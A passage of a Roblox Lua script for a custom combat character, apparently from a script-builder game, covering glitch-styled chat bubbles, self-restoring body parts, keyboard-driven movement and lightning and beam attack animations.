	game:GetService(""TweenService""):Create(Object,Info,Goal):Play()
end

function sc:part(cf,size,trans,mat,col,tweentime,tween)
	local p = Instance.new('Part')
	p.Anchored = true
	p.CanCollide = false
	p.Parent = self.EffectModel
	p.CFrame = cf
	p.Transparency = trans
	p.Material = mat
	p.Color = col
	p.Size = size
	p.CanQuery = false
	p.CanTouch = false
	self:ClientTween(p,TweenInfo.new(tweentime),tween)
	task.delay(tweentime, pcall, game.Destroy, p)
	return p
end

function sc:Wave(cframe,size,trans,col,tweenwait,tween)
	local Wavee = script.Stuff.Wave:Clone()
	Wavee.Parent = self.EffectModel
	Wavee.CFrame = cframe
	Wavee.Size = size
	Wavee.Transparency = trans
	Wavee.Color = col
	self:ClientTween(Wavee,TweenInfo.new(tweenwait),tween)
	task.delay(tweenwait, pcall, game.Destroy, Wavee)
end

function sc:RandomString(length)
	local a = """"
	for i = 1, length do
		a ..= string.char(math.random(1,120))
	end
	return a
end


local chatfuncSymbols = {
	""/"",
	""|"",
	""("",
	""!"",
	""@"",
	""#"",
	""$"",
	""%"",
	""^"",
	""&"",
	""*"",
	""("",
	"")"",
	""<"",
	"">"",
	""?"",
	[[\]],
	""-"",
	""+"",
	""~"",
	""`"",
	""."",
	""["",
	""]"",
	""=""
}

local chatfuncs = {}

function sc:chatfunc(msg)
	task.spawn(function()
		local amountsofchats = #chatfuncs
		if amountsofchats >= 5 then
			chatfuncs[1]:Destroy()
			table.remove(chatfuncs, 1)
		end
		for i, v in next, chatfuncs do
			v.StudsOffset += Vector3.new(0,1.5,0)
		end
		local bil = Instance.new('BillboardGui')
		bil.Name = ""EmperorChatLabelIUFH""..self.Player
		bil.Parent = workspace
		pcall(function()
			bil.Adornee = self.FakeHead.self
		end)
		bil.LightInfluence = 0
		bil.Size = UDim2.new(1000,0,1,0)
		bil.StudsOffset = Vector3.new(-0.7,2.5,0)
		table.insert(chatfuncs, bil)
		local numoftext = 0
		local letters = #msg:sub(1)
		local children = 0
		local texts = {}
		local textdebris = {}
		task.spawn(function()
			for i = 1,string.len(msg) do
				children += .05
				local txt = Instance.new(""TextLabel"")
				txt.Size=UDim2.new(0.001,0,1,0)
				txt.TextScaled=true
				txt.TextWrapped=true
				txt.Font=Enum.Font.GrenzeGotisch
				txt.BackgroundTransparency=1
				txt.TextStrokeTransparency=0
				txt.TextColor3 = Color3.new(0,0,1)
				txt.TextStrokeColor3 = Color3.new(0,0,0)
				txt.Position=UDim2.new(0.5-(-i*(0.001/2)),0,0.5,0)
				txt.Text=msg:sub(i,i)
				txt.ZIndex = 2
				txt.Parent=bil
				bil.StudsOffset-=Vector3.new(0.25,0,0)
				letters-=1
				table.insert(texts, txt)
				numoftext+=1
				task.delay(5.5+children, function()
					local tw = game:GetService('TweenService'):Create(txt,TweenInfo.new(.5),{
						TextTransparency = 1,
						TextStrokeTransparency = 1
					})
					tw:Play()
					tw.Completed:wait()
					txt:Destroy()
					bil.StudsOffset-=Vector3.new(0.25,0,0)
					game:GetService(""TweenService""):Create(bil, TweenInfo.new(.3), {
						StudsOffset=bil.StudsOffset-Vector3.new(0.25,0,0)
					}):Play()
					children -= .1
				end)
				pcall(function()
					local s = Instance.new(""Sound"", self.FakeHead.self)
					s.Volume = 1
					s.SoundId = ""rbxassetid://""..8549394881
					s.Pitch = math.random(80,120)/100
					s.PlayOnRemove = true
					s:Destroy()
				end)
				task.wait()
				task.wait()
				task.wait()
			end
		end)
		game:GetService(""Debris""):AddItem(bil, 20)
		task.spawn(function()
			repeat
				if(not bil)or(not bil:IsDescendantOf(workspace))then
					break
				end
				pcall(function()
					task.wait()
					for i,v in next, texts do
						if(math.random(1,1000) == 1)and(string.sub(msg, i, i) ~= "" "")and v:IsDescendantOf(bil)then
							local origtx = string.sub(msg, i, i)
							v.Text = chatfuncSymbols[math.random(1,#chatfuncSymbols)]
							pcall(function()
								local s = Instance.new(""Sound"", self.FakeHead.self)
								s.Volume = .5
								s.SoundId = ""rbxassetid://""..8622488090
								s.Pitch = math.random(120,150)/100
								s.PlayOnRemove = true
								s:Destroy()
							end)
							task.spawn(function()
								for i = 1, 10 do
									v.Text = chatfuncSymbols[math.random(1,#chatfuncSymbols)]
									task.wait()
									task.wait()
								end
								v.Text = origtx
							end)
						end
					end
				end)
			until not bil:IsDescendantOf(workspace)
		end)
		task.spawn(function()
			repeat
				if(not bil)or(not bil:IsDescendantOf(workspace))then
					break
				end
				pcall(function()
					task.wait()
					if #bil:GetChildren() <= 0 then
						bil:Destroy()
						return
					end
					bil.Adornee = self.FakeHead.self
					bil.Parent = workspace
				end)
			until not bil:IsDescendantOf(workspace)
		end)
		task.spawn(function()
			repeat
				if(not bil)or(not bil:IsDescendantOf(workspace))then
					break
				end
				pcall(function()
					task.wait()
					for i,v in next, texts do
						if(v:IsDescendantOf(bil))then
							if(i ~= #texts)then
								game:GetService('TweenService'):Create(v,TweenInfo.new(.1),{
									Position = UDim2.new(0.5-(-i*(0.001/2)), 0+math.random(-2,2), 0.5, 0+math.random(-2,2)),
									Rotation = math.random(-10,10)
								}):Play()
							else
								local tw = game:GetService('TweenService'):Create(v,TweenInfo.new(.1),{
									Position = UDim2.new(0.5-(-i*(0.001/2)), 0+math.random(-2,2), 0.5, 0+math.random(-2,2)),
									Rotation = math.random(-10,10)
								})
								tw:Play()
								tw.Completed:Wait()
							end
						end
					end
				end)
			until not bil:IsDescendantOf(workspace)
		end)
		task.spawn(function()
			repeat
				if(not bil)or(not bil:IsDescendantOf(workspace))then
					break
				end
				pcall(function()
					task.wait()
					for i,v in next, texts do
						if math.random(1,10) == 1 and v:IsDescendantOf(bil) then
							local tx = v:Clone()
							tx.Parent = bil
							tx.ZIndex = 1
							table.insert(textdebris,tx)
							game:GetService('TweenService'):Create(tx,TweenInfo.new(1),{
								Position = UDim2.new(0.5-(-i*(0.001/2)), 0+math.random(-30,30), 0.5, 0+math.random(-30,30)),
								TextTransparency = 1,
								TextStrokeTransparency = 1,
								Size = UDim2.new(0,0,0),
								TextColor3 = Color3.new(0,0,0)
							}):Play()
							task.delay(1, pcall, game.Destroy, tx)
						end
					end
					task.wait(math.random())
				end)
			until not bil:IsDescendantOf(workspace)
		end)
	end)
end

function sc:Init()
	local self = self
	self.Player = owner.Name
	if(self.Player == """")then
		self.Player = nil
		return
	end
	task.wait()

	if(game:GetService(""ReplicatedStorage""):FindFirstChild(""__FakeChar""..self:GetCurrentPlayer().UserId))then
		game:GetService(""ReplicatedStorage""):FindFirstChild(""__FakeChar""..self:GetCurrentPlayer().UserId):Destroy()
	end
	
	if(game:GetService(""ReplicatedStorage""):FindFirstChild(""__FakeCharRemoteFunction""..self:GetCurrentPlayer().UserId))then
		game:GetService(""ReplicatedStorage""):FindFirstChild(""__FakeCharRemoteFunction""..self:GetCurrentPlayer().UserId):Destroy()
	end

	game:GetService(""JointsService""):ClearAllChildren()
	
	for i, v in next, game:GetService(""Players""):GetPlayers() do
		if(v:FindFirstChildOfClass(""PlayerGui"") and v:FindFirstChildOfClass(""PlayerGui""):FindFirstChild(""__Client""))then
			v:FindFirstChildOfClass(""PlayerGui""):FindFirstChild(""__Client""):Destroy()
		end
	end


	self.FpsValue = self:GetFpsVal()

	for i,v in next, workspace:GetDescendants() do
		if(v:IsA(""WorldModel""))then
			table.insert(self.WorldModels, v)
		end
	end

	table.insert(self.Connections, workspace.DescendantAdded:Connect(function(obj)
		if(obj:IsA(""WorldModel""))then
			table.insert(self.WorldModels, obj)
		end
	end))

	table.insert(self.Connections, workspace.DescendantRemoving:Connect(function(obj)
		if(obj:IsA(""WorldModel"") and table.find(self.WorldModels,obj))then
			table.remove(self.WorldModels, table.find(self.WorldModels,obj))
		end
	end))

	table.insert(sc.Connections, game.DescendantAdded:Connect(function(obj)
		if(not self.isDescendantOfIgnores(obj))then
			self.DecimateCheck(obj)
		end
	end))
	-- -- -- -- -- -- Setup -- -- -- -- -- --

	local sin = 0

	head = nil
	self:AddRefit(getfenv(), ""head"", script.Character.Head, {
		DestroyAfterSeconds = .5,
		Properties = {
			Parent = workspace,
			Anchored = true,
			CanTouch = false,
			CanQuery = false,
			CFrame = CFrame.new()
		},
		OnDestroy = function()
			self.UpdateIgnore()
		end
	})
	self.Head = CFrame.new()

	leftarm = nil
	self:AddRefit(getfenv(), ""leftarm"", script.Character[""Left Arm""], {
		DestroyAfterSeconds = .5,
		Properties = {
			Parent = workspace,
			Anchored = true,
			CanTouch = false,
			CanQuery = false,
			CFrame = CFrame.new()
		},
		OnDestroy = function()
			self.UpdateIgnore()
		end
	})
	self.LeftArm = CFrame.new()

	leftleg = nil
	self:AddRefit(getfenv(), ""leftleg"", script.Character[""Left Leg""], {
		DestroyAfterSeconds = .5,
		Properties = {
			Parent = workspace,
			Anchored = true,
			CanTouch = false,
			CanQuery = false,
			CFrame = CFrame.new()
		},
		OnDestroy = function()
			self.UpdateIgnore()
		end
	})
	self.LeftLeg = CFrame.new()

	rightarm = nil
	self:AddRefit(getfenv(), ""rightarm"", script.Character[""Right Arm""], {
		DestroyAfterSeconds = .5,
		Properties = {
			Parent = workspace,
			Anchored = true,
			CanTouch = false,
			CanQuery = false,
			CFrame = CFrame.new()
		},
		OnDestroy = function()
			rightarm.self.Attachment.CFrame = CFrame.Angles(0,math.rad((sin)/self.FpsValue),0)*CFrame.new(0,-0.4, -0.7)
			rightarm.self.Attachment2.CFrame = CFrame.Angles(0,math.rad((sin)/self.FpsValue),0)*CFrame.new(0,-0.4, 0.7)
			self.UpdateIgnore()
			self.WeaponCheck()
		end,
	})
	self.RightArm = CFrame.new()

	rightleg = nil
	self:AddRefit(getfenv(), ""rightleg"", script.Character[""Right Leg""], {
		DestroyAfterSeconds = .5,
		Properties = {
			Parent = workspace,
			Anchored = true,
			CanTouch = false,
			CanQuery = false,
			CFrame = CFrame.new()
		},
		OnDestroy = function()
			self.UpdateIgnore()
		end,
	})
	self.RightLeg = CFrame.new()

	torso = nil
	self:AddRefit(getfenv(), ""torso"", script.Character.Torso, {
		DestroyAfterSeconds = .5,
		Properties = {
			Parent = workspace,
			Anchored = true,
			CanTouch = false,
			CanQuery = false,
			CFrame = CFrame.new()
		},
		OnDestroy = function()
			torso.self.Chain.CurveSize1 = math.cos(sin/20)
			torso.self.Attachment2.CFrame = CFrame.new(1*math.sin(sin/20), .2*math.cos(sin/30), 4+.2*math.cos(sin/40))
			self.UpdateIgnore()
		end
	})

	axe = nil
	self:AddRefit(getfenv(), ""axe"", script.Character.Axe, {
		DestroyAfterSeconds = 5,
		Properties = {
			Parent = workspace,
			Anchored = true,
			CanTouch = false,
			CanQuery = false,
			CFrame = CFrame.new()
		},
		OnDestroy = function()
			self.UpdateIgnore()
			self.WeaponCheck()
		end,
	})
	self.Axe = CFrame.new()

	local mus = nil
	campart = nil
	self:AddRefit(getfenv(), ""campart"", Instance.new(""Part""), {
		DestroyAfterSeconds = 5,
		OnDestroy = function()
			self:FixCam(campart.self)
			if(not mus or not mus:IsDescendantOf(campart.self))then
				pcall(game.Destroy,mus)
				mus = Instance.new(""Sound"", campart.self)
				mus.SoundId = ""rbxassetid://""..self.Ids[self.SoundIdNum]
				if(not self.Muted)then
					mus.Volume = self.Volume
				else
					mus.Volume = 0
				end
				mus.Pitch = self.Pitch
				mus.TimePosition = self.TimePos
				mus.Looped = true
				mus:Play()
			elseif(mus and mus:IsDescendantOf(campart.self))then
				self.TimePos = mus.TimePosition
				mus.SoundId = ""rbxassetid://""..self.Ids[self.SoundIdNum]
				if(not self.Muted)then
					mus.Volume = self.Volume
				else
					mus.Volume = 0
				end
				mus.Pitch = self.Pitch
				mus.Looped = true
				mus:Resume()
			end
			if(musval)then
				musval.self.Value = mus
			end
			self.UpdateIgnore()
		end,
		DisableDescendantChecks = true,
		Properties = {
			Parent = game:GetService('JointsService'),
			Size = Vector3.new(),
			CFrame = CFrame.new(),
			Transparency = 1
		}
	})
	task.spawn(function()
		task.wait(1/30)
		self:FixCam(campart.self)
	end)

	headval = nil
	self:AddRefit(getfenv(), ""headval"", Instance.new(""ObjectValue""), {
		DestroyAfterSeconds = .5,
		OnDestroy = function()
			headval.self.Value = head.self
		end,
		Properties = {
			Name = ""__FakeCharHead""..self:GetCurrentPlayer().UserId,
			Parent = game:GetService(""JointsService"")
		}
	})
	
	self.FakeHead = head
	
	musval = nil
	self:AddRefit(getfenv(), ""musval"", Instance.new(""ObjectValue""), {
		DestroyAfterSeconds = .5,
		OnDestroy = function()
			musval.self.Value = mus
		end,
		Properties = {
			Name = ""__FakeCharMusic""..self:GetCurrentPlayer().UserId,
			Parent = game:GetService(""JointsService"")
		}
	})
	self.Killaura = false

	function chatfunc(msg)
		sc:chatfunc(msg)
	end

	self.SmokeTime = 0
	self.W = false
	self.A = false
	self.S = false
	self.D = false
	self.CameraCFrame = CFrame.new()
	self.ShiftLock = false
	self.MouseHit = CFrame.new()

	self.RemoteFuncs = function(Player, Type, Data)
		if(Player ~= self:GetCurrentPlayer())then
			return
		end
		if(Type == ""MouseHit"")then
			local hit, pos = self:ClientRaycast(self.CameraCFrame.Position, Data.Value.Position, 9999999999, self.Ignore)
			if(hit)then
				self.MouseHit = CFrame.new(pos.X,pos.Y,pos.Z)
			else
				self.MouseHit = Data.Value
			end
		end
		if(Type == ""Mouse"")then
			if Data.Key==""w"" then
				if Data.Up==false then
					self.W=true
				elseif Data.Up==true then
					self.W=false
				end
			end
			if Data.Key==""a"" then
				if Data.Up==false then
					self.A=true
				elseif Data.Up==true then
					self.A=false
				end
			end
			if Data.Key==""s"" then
				if Data.Up==false then
					self.S=true
				elseif Data.Up==true then
					self.S=false
				end
			end
			if Data.Key==""d"" then
				if Data.Up==false then
					self.D=true
				elseif Data.Up==true then
					self.D=false
				end
			end
			if(Data.Key == ""space"")and(not Data.Up)then
				if(not self.Falling and not self.Jumping and not self.Flying)then
					self.Velocity = Vector3.new(self.Velocity.X,1,self.Velocity.Z)
					self.Jumping = true
				end
			end
			if(Data.Key == ""f"")and(not Data.Up)then
				self.Velocity = Vector3.new()
				self.Falling = false
				self.Jumping = false
				self.Flying = not self.Flying
			end
			if(Data.Key == ""p"")and(not Data.Up)then
				self.RefitCore.Remove()
			end
			if(Data.Key == ""z"")and(not Data.Up)and(not self.AxeEnabled)then
				self.Attack = true
				for i = 1, self:GetFramesToSecond(.3) do
					self.Animate({
						CFrame.new(0,0+.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(0),math.rad(50),math.rad(0))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.5,0+.1*math.cos(sin/36),0)*CFrame.Angles(math.rad(0+5*math.cos(sin/32)),math.rad(30+5*math.cos(sin/35)),math.rad(-5+5*math.cos(sin/34))),
						CFrame.new(-0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(10),math.rad(0)),
						CFrame.new(1.5+.5,0+.3-.1*math.cos(sin/35),-0.3)*CFrame.Angles(math.rad(90+5*math.cos(sin/30)),math.rad(0+5*math.cos(sin/30)),math.rad(50-5*math.cos(sin/32))),
						CFrame.new(0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-30),math.rad(0)),
						CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-50+1*math.cos(sin/35)),math.rad(0-1*math.cos(sin/33))),
					},.3 / self.FpsValue)
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				for i = 1,math.random(1,20) do
					self:Effect(rightarm.self.HandCannon.Hole.Position, 0, Vector3.new(math.random(),math.random(),math.random()), Color3.new(0,0,math.random()), .5, {
						Transparency = 1,
						Color = Color3.new(),
						Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
						Position = rightarm.self.HandCannon.Hole.Position+Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
					},{
						Scale = Vector3.new()
					})
					self:Effect(self.MouseHit.Position, 0, Vector3.new(math.random(),math.random(),math.random()), Color3.new(0,0,math.random()), .5, {
						Transparency = 1,
						Color = Color3.new(),
						Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
						Position = self.MouseHit.Position+Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
					},{
						Scale = Vector3.new()
					})
				end
				self:SpawnTrail(rightarm.self.HandCannon.Hole.Position, self.MouseHit.Position, Color3.new(0,0,1), .5)
				self:SoundEffect(rightarm.self.HandCannon.Hole, 9058737882, 2, math.random(90,110)/100, true)
				self:SoundEffect(rightarm.self.HandCannon.Hole, 9060276709, 1, math.random(90,110)/100, true)
				self.SmokeTime += self:GetFramesToSecond(3)
				self:Aoe(self.MouseHit.Position, 3)
				for i = 1, self:GetFramesToSecond(.3) do
					self.Animate({
						CFrame.new(0,0+.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(0),math.rad(50),math.rad(0))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.5,0+.1*math.cos(sin/36),0)*CFrame.Angles(math.rad(0+5*math.cos(sin/32)),math.rad(30+5*math.cos(sin/35)),math.rad(-5+5*math.cos(sin/34))),
						CFrame.new(-0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(10),math.rad(0)),
						CFrame.new(1.5+.5,0+.3-.1*math.cos(sin/35),-0.3)*CFrame.Angles(math.rad(120+5*math.cos(sin/30)),math.rad(0+5*math.cos(sin/30)),math.rad(50-5*math.cos(sin/32))),
						CFrame.new(0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-30),math.rad(0)),
						CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-50+1*math.cos(sin/35)),math.rad(0-1*math.cos(sin/33))),
					},.3 / self.FpsValue)
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				self.Attack = false
			end
			if(Data.Key == ""c"")and(not Data.Up)and(not self.AxeEnabled)then
				self.Attack = true
				local sparking = true
				local lastlightning = tick()
				local part = Instance.new(""Part"", self.EffectModel)
				part.Anchored = true
				part.CanCollide = false
				part.CanQuery = false
				part.Color = Color3.new(0,0,.7)
				part.Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
				part.Position = (leftarm.self.CFrame*CFrame.new(0,-1,0)).Position
				part.Size = Vector3.new(.3,.3,.3)
				part.Material = Enum.Material.Glass
				local cursor = script.Stuff.CursorHit:Clone()
				cursor.Parent = self.EffectModel
				local param = RaycastParams.new()
				param.FilterDescendantsInstances = self.Ignore
				local size = 0
				task.spawn(function()
					while sparking do
						self.Animate({
							CFrame.new(-0.0165080037, 0, -0.002173702, 0.965925872, 0, -0.258818835, 0, 1, 0, 0.258818835, 0, 0.965925872)*CFrame.Angles(0,math.rad(-180),0),
							CFrame.new(-1.68117309, 0.600000203, -0.676147878, 0.965925813, 0.224143684, -0.129409224, 1.80666973e-07, -0.50000006, -0.866025388, -0.258818716, 0.836516321, -0.482963055)*CFrame.Angles(math.rad(0+5*math.cos(sin/32)),math.rad(0+5*math.cos(sin/35)),math.rad(0+5*math.cos(sin/34))),
							CFrame.new(-0.500000656, -2, 4.32133675e-07, 0.965925813, 0, 0.258819044, 0, 1, 0, -0.258819044, 0, 0.965925813),
							CFrame.new(1.59836626, -0.0565129519, -0.238548517, 0.87782234, -0.429628849, -0.211770743, 0.159562185, 0.679161251, -0.716435492, 0.451627851, 0.595112503, 0.664735436)*CFrame.Angles(math.rad(0+5*math.cos(sin/35)),math.rad(0+5*math.cos(sin/33)),math.rad(0+5*math.cos(sin/38))),
							CFrame.new(0.499998301, -2, 1.02818012e-06, 0.866025329, 0, -0.500000179, 0, 1, 0, 0.500000179, 0, 0.866025329),
							CFrame.new(0.0165081024, 1.5, -0.00217294693, 0.866025448, 0, 0.499999791, 0, 1, 0, -0.499999791, 0, 0.866025448)
						}, .1 / self.FpsValue)
						size += .005
						if(tick() - lastlightning)>=.3 then
							local dist = 1+size
							self:Lightning((leftarm.self.CFrame*CFrame.new(0,-1+(-.3-size),0)).Position+Vector3.new(math.random(-dist,dist),math.random(-dist,dist),math.random(-dist,dist)), (leftarm.self.CFrame*CFrame.new(0,-1+(-.3-size),0)).Position+Vector3.new(math.random(-dist,dist),math.random(-dist,dist),math.random(-dist,dist)), 3*dist, 3, Color3.new(0,0,1), .3)
							lastlightning = tick()
						end
						local p = Instance.new(""Part"", self.EffectModel)
						p.Anchored = true
						p.CanCollide = false
						p.CanQuery = false
						p.Color = Color3.new(0,0,.7)
						p.Material = Enum.Material.Glass
						p.Size = Vector3.new(.3+size,.3+size,.3+size)
						p.Position = (leftarm.self.CFrame*CFrame.new(0,-1+(-.3-size),0)).Position
						p.Orientation = Vector3.new(sin/3,sin/2,sin)
						self:ClientTween(p, TweenInfo.new(.5), {
							Size = Vector3.new(.3+size+.2,.3+size+.2,.3+size+.2),
							Transparency = 1,
							Color = Color3.new(0,0,1)
						})
						task.delay(.5, pcall, game.Destroy, p)
						part.Size = Vector3.new(.3+size,.3+size,.3+size)
						part.Position = (leftarm.self.CFrame*CFrame.new(0,-1+(-.3-size),0)).Position
						part.Orientation = Vector3.new(sin/3,sin/2,sin)
						param.FilterDescendantsInstances = self.Ignore
						local ray = workspace:Raycast(self.CameraCFrame.Position, (self.MouseHit.Position - self.CameraCFrame.Position)*2, param)
						if(ray)then
							cursor.CFrame = cursor.CFrame:Lerp(CFrame.new(ray.Position, ray.Position + ray.Normal) * CFrame.Angles(math.rad(-90), math.rad(sin%360), 0), .3)
						end
						game:GetService(""RunService"").PostSimulation:Wait()
					end
				end)
				task.wait(5)
				sparking = false
				local hit = self.MouseHit
				local ray = workspace:Raycast(self.CameraCFrame.Position, (self.MouseHit.Position - self.CameraCFrame.Position)*2, param)
				if(not ray)then
					self.Attack = false
					return
				end
				self:ClientTween(cursor, TweenInfo.new(1, Enum.EasingStyle.Exponential), {
					Size = Vector3.new(10,0.1,10),
					CFrame = CFrame.new(ray.Position, ray.Position + ray.Normal) * CFrame.Angles(math.rad(-90), math.rad(cursor.Orientation.Z+360), 0)
				})
				self:ClientTween(cursor.Decal, TweenInfo.new(1, Enum.EasingStyle.Exponential),{
					Transparency = 1
				})
				task.delay(1, pcall, game.Destroy, cursor)
				for i = 1, self:GetFramesToSecond(.1) do
					self.Animate({
						CFrame.new(-0.0165080037, 0, -0.002173702, 0.965925872, 0, -0.258818835, 0, 1, 0, 0.258818835, 0, 0.965925872)*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.55176365, 1.1000005, -0.193184972, 0.965925872, 0.129409432, -0.224143475, 1.0430815e-07, -0.866025388, -0.50000006, -0.258818626, 0.482962996, -0.83651638),
						CFrame.new(-0.500000656, -2, 4.32133675e-07, 0.965925813, 0, 0.258819044, 0, 1, 0, -0.258819044, 0, 0.965925813),
						CFrame.new(1.59836626, -0.0565129519, -0.238548517, 0.87782234, -0.429628849, -0.211770743, 0.159562185, 0.679161251, -0.716435492, 0.451627851, 0.595112503, 0.664735436),
						CFrame.new(0.499998301, -2, 1.02818012e-06, 0.866025329, 0, -0.500000179, 0, 1, 0, 0.500000179, 0, 0.866025329),
						CFrame.new(0.0682707876, 1.49999988, 0.191012651, 0.87500006, 0.129409418, 0.466506183, 0.129409522, 0.866025388, -0.482962906, -0.466506153, 0.482962936, 0.741025448)
					}, .3 / self.FpsValue)
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				for i = 1,math.random(1,5) do
					self:Lightning(part.Position, part.Position + Vector3.new(0,80,0), 1, 15, Color3.new(0,0,1), .5+size/2)
				end
				pcall(game.Destroy, part)
				for i = 1, self:GetFramesToSecond(.5) do
					self.Animate({
						CFrame.new(-0.0165080037, 0, -0.002173702, 0.965925872, 0, -0.258818835, 0, 1, 0, 0.258818835, 0, 0.965925872)*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.55176365, 1.1000005, -0.193184972, 0.965925872, 0.129409432, -0.224143475, 1.0430815e-07, -0.866025388, -0.50000006, -0.258818626, 0.482962996, -0.83651638),
						CFrame.new(-0.500000656, -2, 4.32133675e-07, 0.965925813, 0, 0.258819044, 0, 1, 0, -0.258819044, 0, 0.965925813),
						CFrame.new(1.59836626, -0.0565129519, -0.238548517, 0.87782234, -0.429628849, -0.211770743, 0.159562185, 0.679161251, -0.716435492, 0.451627851, 0.595112503, 0.664735436),
						CFrame.new(0.499998301, -2, 1.02818012e-06, 0.866025329, 0, -0.500000179, 0, 1, 0, 0.500000179, 0, 0.866025329),
						CFrame.new(0.0682707876, 1.49999988, 0.191012651, 0.87500006, 0.129409418, 0.466506183, 0.129409522, 0.866025388, -0.482962906, -0.466506153, 0.482962936, 0.741025448)
					}, .1 / self.FpsValue)
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				task.delay(3, function()
					for i = 1, math.random(1,5) do
						self:Lightning(hit.Position + Vector3.new(0,80,0), hit.Position, 1, 15, Color3.new(0,0,1), .5+size/2)
					end
					task.wait(.5)
					local sparking = true
					local lastspark = tick()
					local p = Instance.new(""Part"", self.EffectModel)
					p.Anchored = true
					p.CanCollide = false
					p.CanQuery = false
					p.Transparency = 1
					p.CFrame = hit
					self:SoundEffect(p, 165796875, 10, 1, false)
					task.spawn(function()
						while sparking do
							if(tick() - lastspark)>=.2 then
								self:Lightning(hit.Position + Vector3.new(math.random(-7, 7),math.random(-7, 7),math.random(-7, 7)), hit.Position + Vector3.new(math.random(-7, 7),math.random(-7, 7),math.random(-7, 7)), 10, 15, Color3.new(0,0,1), .5)
								lastspark = tick()
							end
							game:GetService(""RunService"").PostSimulation:Wait()
						end
					end)
					task.wait(2)
					sparking = false
					self:SoundEffect(p, 4988868452, 10, 1, true)
					task.delay(0, pcall, game.Destroy, p)
					local done = false
					local p2 = self:part(CFrame.new(hit.Position),Vector3.new(30,30,30),0,Enum.Material.Neon,Color3.new(0,0,1),10,{
						Transparency = 1,
						Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
					})
					p = self:part(CFrame.new(hit.Position)*CFrame.new(0,2048/2,0),Vector3.new(15,2048,15),0,Enum.Material.Neon,Color3.new(0,0,1),10,{
						Transparency = 1,
						Orientation = Vector3.new(0,math.random(-360,360),0)
					})
					local start = tick()
					task.spawn(function()
						pcall(function()
							local a = 0
							local b = false
							repeat
								game:GetService(""RunService"").PostSimulation:Wait()
								a += 1
								if a >= 10 then
									a = 0
									b = not b
									if b == true then
										self:ClientTween(p,TweenInfo.new(.5),{
											Size = Vector3.new(15/2,2048,15/2)
										})
									elseif b == false then
										self:ClientTween(p,TweenInfo.new(.5),{
											Size = Vector3.new(15,2048,15)
										})
									end
								end
							until done == true
						end)
					end)
					task.spawn(function()
						pcall(function()
							repeat
								game:GetService(""RunService"").PostSimulation:Wait()
								self:Wave(CFrame.new(hit.Position),Vector3.new(0,0,0),(tick() - start)/10,Color3.new(0,0,1),.5,{
									Size = Vector3.new(70,5,70),
									Transparency = 1,
									Orientation = Vector3.new(0,math.random(-360,360),0)
								})
								if(tick() - start)<=7 then
									if(math.random(1,8)) == 1 then
										self:Lightning(hit.Position + Vector3.new(math.random(-40, 40),math.random(-5, 40),math.random(-40, 40)), hit.Position + Vector3.new(math.random(-40, 40),math.random(-5, 40),math.random(-40, 40)), 10, 15, Color3.new(0,0,1), math.random(80,300)/100)
										lastspark = tick()
									end
								end
								self:Aoe(hit.Position, 50)
							until done == true
						end)
					end)
					repeat game:GetService(""RunService"").PostSimulation:Wait() until not p2:IsDescendantOf(workspace)
					done = true
				end)
				self.Attack = false
			end
			if(Data.Key == ""v"")and(not Data.Up)and(not self.AxeEnabled)then
				self.Attack = true
				leftarm.self.Sword.Transparency = .99
				leftarm.self.Sword.Material = Enum.Material.Glass
				leftarm.self.Sword.Highlight.Enabled = true
				for i = 1, self:GetFramesToSecond(.7) do
					self.Animate({
						CFrame.new(-0.0529786237, 0, -0.00697433716, 0.965925872, 0, -0.258818835, 0, 1, 0, 0.258818835, 0, 0.965925872)*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.59793985, 0.738437891, -0.365518063, 0.875000179, 0.129409432, -0.466506004, -0.129409432, -0.866025388, -0.482962996, -0.466506004, 0.482962996, -0.741025686)*CFrame.Angles(math.rad(0+5*math.cos(sin/33)),math.rad(0+5*math.cos(sin/30)),math.rad(0+5*math.cos(sin/40))),
						CFrame.new(-0.551762879, -2, -0.193185553, 0.939692557, 0, 0.342020094, 0, 1, 0, -0.342020094, 0, 0.939692557),
						CFrame.new(1.52579713, -0.0742611289, -0.423438966, 0.842993081, -0.31206122, -0.438155591, -0.0123708099, 0.803068221, -0.595758557, 0.537782013, 0.507640779, 0.673120499)*CFrame.Angles(math.rad(0+5*math.cos(sin/35)),math.rad(0+5*math.cos(sin/33)),math.rad(0+5*math.cos(sin/38))),
						CFrame.new(0.570710957, -2, -0.12247543, 0.866025329, 0, -0.500000179, 0, 1, 0, 0.500000179, 0, 0.866025329),
						CFrame.new(0.0788603872, 1.49999988, 0.0896173641, 0.965925872, 0.0449434146, 0.254886806, 0, 0.984807789, -0.173648164, -0.258818835, 0.167731255, 0.951251328)
					}, .1 / self.FpsValue)
					leftarm.self.Sword.Transparency = .99
					leftarm.self.Sword.Material = Enum.Material.Glass
					leftarm.self.Sword.Highlight.Enabled = true
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				self:SoundEffect(leftarm.self.Sword, 7171591581, 3, math.random(90, 110)/100, true)
